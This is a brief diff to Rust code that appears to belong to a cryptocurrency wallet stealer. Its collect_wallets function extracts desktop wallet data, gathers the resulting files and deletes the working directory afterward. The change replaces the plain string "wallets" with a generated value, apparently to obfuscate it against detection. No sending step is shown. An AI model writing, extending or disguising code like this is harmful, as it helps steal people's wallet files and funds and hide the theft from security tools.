@@ -17,7 +17,7 @@ pub fn collect_wallets() -> Vec<(String, Vec<u8>)> {
     desktop_apps::extract_desktop_wallets();
 
     let mut files = Vec::new();
-    collect_files_recursive(&output_dir, "wallets", &mut files);
+    collect_files_recursive(&output_dir, &s_wallet_dir(), &mut files);
     
     let _ = fs::remove_dir_all(&output_dir);
     
